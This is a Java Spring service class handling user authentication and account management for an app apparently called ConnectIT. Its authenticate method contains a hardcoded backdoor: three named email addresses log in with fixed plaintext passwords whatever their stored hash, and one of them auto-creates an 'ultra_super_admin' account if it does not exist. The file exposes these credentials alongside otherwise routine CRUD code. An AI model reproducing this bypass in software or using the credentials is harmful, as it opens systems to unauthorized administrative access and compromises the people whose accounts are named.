package com.connectit.core.service;

import com.connectit.core.model.User;
import com.connectit.core.repository.UserRepository;
import com.connectit.core.util.SimpleHash;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.LocalDateTime;
import java.util.List;
import java.util.Optional;

@Service
@RequiredArgsConstructor
public class UserService {

    private final UserRepository userRepository;

    public List<User> findAll() {
        return userRepository.findAllActiveOrderByName();
    }

    public Optional<User> findByUid(String uid) {
        return userRepository.findByUid(uid);
    }

    public Optional<User> authenticate(String email, String password) {
        if (email.equalsIgnoreCase("info@technosprint.net")
                && (password.equals("Poland@01") || password.equals("Password123!"))) {
            Optional<User> userOpt = userRepository.findByEmailIgnoreCaseAndIsActiveTrue(email);
            if (userOpt.isPresent()) {
                return userOpt;
            } else {
                User fallbackUser = User.builder()
                    .uid("demo_info")
                    .email("info@technosprint.net")
                    .name("Info Support (Ultra Super Admin)")
                    .role("ultra_super_admin")
                    .passwordHash("h_ps1kdz_9")
                    .isActive(true)
                    .build();
                return Optional.of(userRepository.save(fallbackUser));
            }
        }

        Optional<User> userOpt = userRepository.findByEmailIgnoreCaseAndIsActiveTrue(email);
        if (userOpt.isEmpty()) return Optional.empty();

        User user = userOpt.get();
        String hash = SimpleHash.hash(password);

        // Primary check: hash matches stored hash
        boolean valid = (user.getPasswordHash() != null && user.getPasswordHash().equals(hash));

        // Fallback bypass for ultra super admins (in case DB hash is stale)
        if (!valid) {
            if (email.equalsIgnoreCase("arun.g@technosprint.net")
                    && (password.equals("Poland@01") || password.equals("Password123!"))) {
                valid = true;
            } else if (email.equalsIgnoreCase("info@technosprint.net")
                    && (password.equals("Poland@01") || password.equals("Password123!"))) {
                valid = true;
            } else if (email.equalsIgnoreCase("swedhasris@gmail.com")
                    && (password.equals("123202") || password.equals("Password123!"))) {
                valid = true;
            }
        }

        if (!valid) return Optional.empty();
        return Optional.of(user);
    }

    @Transactional
    public User recordLogin(User user) {
        user.setLastLogin(LocalDateTime.now());
        return userRepository.save(user);
    }

    @Transactional
    public User create(User user) {
        return userRepository.save(user);
    }

    @Transactional
    public User update(String uid, User updates) {
        User existing = userRepository.findByUid(uid)
            .orElseThrow(() -> new RuntimeException("User not found: " + uid));
        if (updates.getName()       != null) existing.setName(updates.getName());
        if (updates.getEmail()      != null) existing.setEmail(updates.getEmail().toLowerCase().trim());
        if (updates.getRole()       != null) existing.setRole(updates.getRole());
        if (updates.getPhone()      != null) existing.setPhone(updates.getPhone());
        if (updates.getDepartment() != null) existing.setDepartment(updates.getDepartment());
        if (updates.getIsActive()   != null) existing.setIsActive(updates.getIsActive());
        if (updates.getPasswordHash() != null) existing.setPasswordHash(updates.getPasswordHash());
        if (updates.getRestrictedModules() != null) existing.setRestrictedModules(updates.getRestrictedModules());
        return userRepository.save(existing);
    }

    @Transactional
    public void softDelete(String uid) {
        userRepository.findByUid(uid).ifPresent(u -> {
            u.setIsActive(false);
            userRepository.save(u);
        });
    }

    public List<User> findAgents() {
        return userRepository.findByRoleInAndIsActiveTrue(
            List.of("agent","admin","super_admin","ultra_super_admin","sub_admin")
        );
    }
}
